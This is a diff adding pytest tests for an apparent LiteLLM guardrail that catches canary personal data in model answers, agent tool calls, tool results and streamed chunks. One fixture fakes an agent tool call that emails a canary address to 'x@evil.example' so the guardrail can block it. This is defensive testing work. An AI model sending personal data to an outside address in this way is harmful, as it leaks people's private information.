@@ -68,3 +68,66 @@ def test_new_canaries_are_picked_up_after_refresh(demo):
     finally:
         lg._state["refresh_every"] = 300.0
     assert out["metadata"]["shinafure"]["confirmed"] == 1
+
+
+# ---------------------------------------------------------------- v1.3: output side
+def model_response(content=None, tool_args=None):
+    import litellm
+    msg = {"role": "assistant", "content": content}
+    if tool_args is not None:
+        msg["tool_calls"] = [{"id": "c1", "type": "function", "function": {"name": "send_email", "arguments": tool_args}}]
+    return litellm.ModelResponse(choices=[{"index": 0, "finish_reason": "stop", "message": msg}])
+
+
+def test_output_and_agent_tool_calls_are_checked(demo):
+    det, cs = demo
+    g = lg.ShinafureGuardrail(detector=det, policy="block", guardrail_name="shinafure")
+    ok = run(g.async_post_call_success_hook({}, None, model_response("整形しました")))
+    assert ok.choices[0].message.content == "整形しました"
+    with pytest.raises(Exception):                                   # the answer itself leaks a canary
+        run(g.async_post_call_success_hook({}, None, model_response(f"{cs[0].person['email']} です")))
+    args = '{"to": "x@evil.example", "body": "' + cs[1].person["email"] + '"}'
+    with pytest.raises(Exception):                                   # an agent is about to send it out
+        run(g.async_post_call_success_hook({}, None, model_response(None, args)))
+
+
+def test_tool_results_in_the_conversation_are_checked(demo):
+    det, cs = demo
+    g = lg.ShinafureGuardrail(detector=det, policy="flag", guardrail_name="shinafure")
+    data = {"messages": [{"role": "user", "content": "顧客を調べて"},
+                         {"role": "assistant", "tool_calls": [{"function": {"name": "db", "arguments": "{}"}}]},
+                         {"role": "tool", "content": f"rows: {cs[2].person['email']}"}]}
+    assert run(g.async_pre_call_hook(None, None, data, "acompletion"))["metadata"]["shinafure"]["confirmed"] == 1
+
+
+def stream(texts):
+    import litellm
+
+    async def gen():
+        for t in texts:
+            yield litellm.ModelResponseStream(choices=[{"index": 0, "delta": {"role": "assistant", "content": t}}])
+    return gen()
+
+
+def collect(agen):
+    async def go():
+        return [c async for c in agen]
+    return run(go())
+
+
+def test_streams_are_checked_and_held_back_when_blocking(demo):
+    det, cs = demo
+    email = cs[3].person["email"]
+    flag = lg.ShinafureGuardrail(detector=det, policy="flag", guardrail_name="shinafure")
+    data = {}
+    out = collect(flag.async_post_call_streaming_iterator_hook(None, stream(["連絡先: ", email[:10], email[10:]]), data))
+    assert len(out) == 3 and data["metadata"]["shinafure_output"]["confirmed"] == 1   # split across chunks, still found
+    block = lg.ShinafureGuardrail(detector=det, policy="block", guardrail_name="shinafure")
+    got = []
+
+    async def consume():
+        async for c in block.async_post_call_streaming_iterator_hook(None, stream(["連絡先: ", email]), {}):
+            got.append(c)
+    with pytest.raises(Exception):
+        run(consume())
+    assert got == []                                                 # nothing was sent before the check
